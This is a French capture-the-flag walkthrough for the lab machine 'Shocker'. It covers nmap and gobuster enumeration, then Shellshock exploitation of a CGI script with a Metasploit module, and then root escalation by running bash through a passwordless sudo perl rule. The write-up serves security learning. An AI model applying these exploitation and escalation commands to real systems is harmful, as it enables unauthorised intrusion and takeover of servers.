# Shocker - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 17:06 EST
Nmap scan report for 10.10.10.56
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 avec apache → on va voir ce qu’il s’y passe.

On arrive sur une page avec une image et un texte: “don’t bug me”.

On lance alors une analyse gobuster en fond

```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Rien dans le code source de la page, rien de trouvé d’accessible dans le gobuster.

On regarde donc du coté de openssh et de sa version et on tombe sur ceci:

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/40136)

On teste alors l’exploit mais il nous faut un user, on tente alors avec bug et shocker mais aucun résultat. En revanche si on prend également la version d’ubuntu qui va avec à cause de la mauvaise config du serveur. Il est aussi possible de trouver la version d’ubuntu précise en partant de la version d’apache, il suffit de regarder dans les packages ubuntu et leurs version associées. Rien de particulier du coup.

En revanche on a trouvé le repertoire /cgi-bin/ donc on essaye d’explorer à partir de celui-ci. On essaye avec des fichiers courants

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,php,ini,sql
```

Et on trouve le fichier user.sh, on regarde le contenu.

```bash
Content-Type: text/plain

Just an uptime test script

 11:41:02 up 35 min,  0 users,  load average: 0.00, 0.02, 0.02
```

Il semble que le serveur run la commande et nous renvoie le résultat. Vu que le serveur utilise CGI (Common Gateway Interface) on pense à un shellshock, on va donc voir si un exploit metasploit est disponible.

```bash
sudo msfdb init && sudo msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.10.10.56
set TARGETURI /cgi-bin/user.sh
check
[+] 10.10.10.56:80 - The target is vulnerable.
```

On voit donc que le site est vulnérable, on tente l’exploitation

```bash
exploit
shell
```

Et on est bien connecté en tant que shelly

On tente d’upgrade le shell qu’on a obtenu: 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On est donc en mesure de récupérer le flag user !

Premier réflexe on regarde les droits sudo

```bash
sudo -l
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

On pense alors à créer un perl qui créée un bash en tant que root

```bash
cd /tmp
echo "system('/bin/bash');" > test.pl
sudo /usr/bin/perl test.pl
```

On obtient un shell root et le flag root !